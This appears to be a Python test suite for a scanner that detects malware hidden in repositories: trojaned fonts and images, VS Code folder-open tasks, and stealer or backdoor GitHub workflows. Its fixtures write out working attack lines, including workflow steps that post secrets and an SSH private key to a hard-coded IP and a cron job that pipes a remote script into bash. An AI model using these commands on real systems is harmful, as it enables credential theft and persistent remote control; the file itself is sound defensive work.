        outside = tempfile.mkdtemp(prefix="prscan_out_")
        try:
            with open(os.path.join(outside, "secret.woff2"), "w") as fh:
                fh.write("SECRET-VALUE")
            repo = os.path.join(outside, "repo")
            os.makedirs(os.path.join(repo, ".vscode"))
            with open(os.path.join(repo, ".vscode", "tasks.json"), "w") as fh:
                json.dump({"tasks": [{"command": "node ../secret.woff2", "runOptions": {"runOn": "folderOpen"}}]}, fh)
            s = ps.RepoScan(repo, set(ps.DEFAULT_SKIP_DIRS), [], 16 << 20).run()
            self.assertNotIn("SECRET", json.dumps(s.findings))
            self.assertEqual(s.findings[0]["targets"], [])
        finally:
            shutil.rmtree(outside, ignore_errors=True)

    def test_single_file_root_keeps_its_rule(self):
        p = self.t.w("eslint.config.js", implant_line("function GSkqN(a){return a}"))
        f = ps.RepoScan(p, set(ps.DEFAULT_SKIP_DIRS), [], 16 << 20).run().findings
        self.assertEqual((f[0]["severity"], f[0]["path"]), (ps.HIGH, "eslint.config.js"))

    @unittest.skipIf(os.name != "posix" or os.geteuid() == 0, "needs a non-root POSIX user")
    def test_unreadable_folder_is_reported(self):
        self.t.w("locked/fonts/a.woff2", GI)
        d = os.path.join(self.t.root, "locked")
        os.chmod(d, 0)
        try:
            f = self.t.scan().findings
        finally:
            os.chmod(d, stat.S_IRWXU)
        self.assertEqual([x["rule"] for x in f], ["unreadable"])

    def test_vertical_tab_and_nbsp_runs(self):
        self.t.w("postcss.config.js", "module.exports={}" + (" " * 99 + "\v") * 3 + GI + "x" * 2000)
        self.t.w("vite.config.js", "export default {}" + " " * 150 + GI + "x" * 2000)
        self.assertEqual(len(by_rule(self.t.scan(), "hidden-code")), 2)

    def test_harmless_padded_line_does_not_mask_the_implant(self):
        self.t.w("src/x.js", implant_line("a table row") + "\n" + implant_line(GI))
        self.assertEqual(by_rule(self.t.scan(), "hidden-code")[0]["severity"], ps.HIGH)

    def test_html_page_in_a_font_is_review(self):
        self.t.w("fonts/a.woff2", "<!DOCTYPE html><html><body>404 Not Found</body></html>")
        self.assertEqual(by_rule(self.t.scan(), "fake-font")[0]["severity"], ps.REVIEW)


class TestMachineRegressions(TestMachine):
    def test_windows_environment_is_case_insensitive(self):
        env = {"PROGRAMFILES": os.path.join(self.t.root, "PF"), "LOCALAPPDATA": os.path.join(self.t.root, "L"), "USERNAME": "dev"}
        self.t.w("PF/Microsoft VS Code/resources/app/out/main.js", INZ)
        f = self.ms(system="Windows", env=env).findings
        self.assertEqual([x["rule"] for x in f], ["app-trojaned"])

    @unittest.skipIf(os.name != "posix" or os.geteuid() == 0, "needs a non-root POSIX user")
    def test_unreadable_runner_folder_does_not_crash(self):
        self.t.w("home/.node_modules/axios/package.json", "{}")
        d = os.path.join(self.t.root, "home", ".node_modules")
        os.chmod(d, 0o300)
        try:
            f = self.ms().findings
        finally:
            os.chmod(d, stat.S_IRWXU)
        self.assertEqual(f[0]["severity"], ps.REVIEW)


GA_ADDR = "193.32." "204.199"
GA_STEALER = ("name: Build Check\non: [push]\njobs:\n  audit:\n    runs-on: ubuntu-latest\n    steps:\n"
              "      - run: curl -s -X POST -d 'K=${{ secrets.K }}' http://" + GA_ADDR + ":8080/?c=og2\n")
GA_BACKDOOR = ("name: Runner Maintenance\njobs:\n  cleanup:\n    runs-on: self-hosted\n    steps:\n"
               "      - run: |\n          r=$(cat ~/.ssh/id_rsa)\n"
               "          curl -s -X POST --data-binary \"$r\" http://" + GA_ADDR + ":8080/?c=reinject\n"
               "          (crontab -l; echo '*/5 * * * * curl -s http://" + GA_ADDR + ":8080/c2/x | bash " + GHC2 + "') | crontab -\n")


class TestGhostAction(Base):
    def test_stealer_workflow(self):
        self.t.w(".github/workflows/build-check.yml", GA_STEALER)
        s = self.t.scan()
        f = by_rule(s, "ghostaction-workflow")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], ps.HIGH)
        self.assertEqual(by_rule(s, "marker"), [])
        self.assertEqual(s.checked["workflow_files"], 1)

    def test_runner_backdoor(self):
        self.t.w(".github/workflows/runner-maintenance.yaml", GA_BACKDOOR)
        s = self.t.scan()
        f = by_rule(s, "ghostaction-runner-backdoor")
        self.assertEqual(len(f), 1)
        self.assertIn("self-hosted runner", f[0]["detail"])
        self.assertEqual(by_rule(s, "ghostaction-workflow"), [])

    def test_clean_workflow_is_not_a_finding(self):
        self.t.w(".github/workflows/ci.yml", "on: [push]\njobs:\n  t:\n    runs-on: self-hosted\n    steps:\n      - run: crontab -l\n")
        self.assertEqual(self.t.scan().findings, [])

    def test_other_markers_in_a_workflow_still_count(self):
        self.t.w(".github/workflows/x.yml", "steps:\n  - run: echo '" + GI + "'\n")
        self.assertEqual(len(by_rule(self.t.scan(), "marker")), 1)

    def test_address_outside_workflows_is_a_marker(self):
        self.t.w("deploy/blocklist.yml", "deny: " + GA_ADDR + "\n")
        s = self.t.scan()
        self.assertEqual(len(by_rule(s, "marker")), 1)
        self.assertEqual(by_rule(s, "ghostaction-workflow"), [])

    def test_single_file_argument(self):
        p = self.t.w(".github/workflows/lint.yml", GA_STEALER)
        s = ps.RepoScan(p, set(ps.DEFAULT_SKIP_DIRS), [], 16 << 20).run()
        self.assertEqual(len(by_rule(s, "ghostaction-workflow")), 1)

    def test_advice_matches_what_was_found(self):
        self.t.w(".github/workflows/build-check.yml", GA_STEALER)
        out = ps.render_text("repository", ["r"], self.t.scan().findings, self.t.scan().checked)
        self.assertIn(ps.GHOSTACTION_STEPS, out)
        self.assertNotIn(ps.NEXT_STEPS, out)
        self.assertNotIn(ps.RUNNER_STEPS, out)
        self.assertIn("1 workflows", out)

    def test_backdoor_adds_runner_steps(self):
        self.t.w(".github/workflows/runner-maintenance.yml", GA_BACKDOOR)
        out = "\n".join(ps.next_steps(self.t.scan().findings))
        self.assertIn(ps.GHOSTACTION_STEPS, out)
        self.assertIn(ps.RUNNER_STEPS, out)

    def test_mixed_findings_get_both_sets_of_steps(self):
        self.t.w(".github/workflows/build-check.yml", GA_STEALER)
        self.t.w("public/fonts/fa-solid-400.woff2", "var a=1;" + " " * 10 + GI)
        steps = ps.next_steps(self.t.scan().findings)
        self.assertEqual(steps[:2], [ps.NEXT_STEPS, ps.GHOSTACTION_STEPS])


class TestRealShapes(Base):
    """Shapes read from real infected repositories on 2026-11-10 that carried no known marker."""

    def test_glb_holding_plain_obfuscated_javascript(self):
        self.t.w("public/models/a.glb", "var a0mHTc,zJY1EF,Oy7hul;(function(){return 1})();")
        self.t.w("public/models/b.glb", "(function(P,E){const t=P();while(!![]){try{break}catch(e){}}})(x,1);")
        self.assertEqual(len(by_rule(self.t.scan(), "fake-font")), 2)

    def test_javascript_under_an_image_name(self):
        self.t.w("assets/a.svg", "const _0x34d9d9=_0x48a2;(function(_0x5f4c39){})();")
        self.t.w("assets/b.jpeg", "function EJWG(a){return a}")
        self.t.w("assets/c.svg", "\n" + " " * 200 + GI)
        f = by_rule(self.t.scan(), "fake-image")
        self.assertEqual(sorted(x["path"] for x in f), ["assets/a.svg", "assets/b.jpeg", "assets/c.svg"])

    def test_real_images_are_clean(self):
        self.t.w("a.svg", '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>var a=1;</script></svg>')
        self.t.w("b.svg", '<svg viewBox="0 0 1 1"><path d="M0 0"/></svg>')
        self.t.w("c.png", b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + os.urandom(100))
        self.t.w("d.jpg", b"\xff\xd8\xff\xe0\x00\x10JFIF" + os.urandom(100))
        self.t.w("e.png", "version https://git-lfs.github.com/spec/v1\noid sha256:%s\nsize 9\n" % ("a" * 64))
        self.assertEqual(self.t.scan().findings, [])


if __name__ == "__main__":
    unittest.main()
